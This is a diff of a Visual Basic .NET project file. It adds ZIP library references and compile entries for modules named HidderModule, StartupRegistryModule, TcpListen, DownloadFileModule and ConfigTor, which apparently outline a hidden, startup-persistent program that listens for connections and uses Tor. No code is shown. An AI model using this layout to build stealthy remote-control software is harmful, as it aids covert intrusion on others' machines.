@@ -57,6 +57,12 @@
     <Reference Include="System" />
     <Reference Include="System.Data" />
     <Reference Include="System.Deployment" />
+    <Reference Include="System.IO.Compression.FileSystem" />
+    <Reference Include="System.IO.Compression.ZipFile, Version=4.0.2.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.IO.Compression.ZipFile.4.3.0\lib\net46\System.IO.Compression.ZipFile.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
     <Reference Include="System.Xml" />
     <Reference Include="System.Core" />
     <Reference Include="System.Xml.Linq" />
@@ -75,9 +81,16 @@
     <Import Include="System.Threading.Tasks" />
   </ItemGroup>
   <ItemGroup>
+    <Compile Include="Class\Network\TcpListen.vb" />
     <Compile Include="Main.vb" />
-    <Compile Include="Moduls\ConfigTor.vb" />
-    <Compile Include="Moduls\GetPathes.vb" />
+    <Compile Include="Moduls\IO\UnZIPModule.vb" />
+    <Compile Include="Moduls\Network\DownloadFileModule.vb" />
+    <Compile Include="Moduls\Network\StreamWrite.vb" />
+    <Compile Include="Moduls\Tor\ConfigTor.vb" />
+    <Compile Include="Moduls\IO\GetPathes.vb" />
+    <Compile Include="Moduls\Installer\HidderModule.vb" />
+    <Compile Include="Moduls\Installer\StartupRegistryModule.vb" />
+    <Compile Include="Moduls\IO\IOModule.vb" />
     <Compile Include="My Project\AssemblyInfo.vb" />
     <Compile Include="My Project\Application.Designer.vb">
       <AutoGen>True</AutoGen>
@@ -113,6 +126,8 @@
       <LastGenOutput>Settings.Designer.vb</LastGenOutput>
     </None>
     <None Include="App.config" />
+    <None Include="packages.config" />
   </ItemGroup>
+  <ItemGroup />
   <Import Project="$(MSBuildToolsPath)\Microsoft.VisualBasic.targets" />
 </Project>
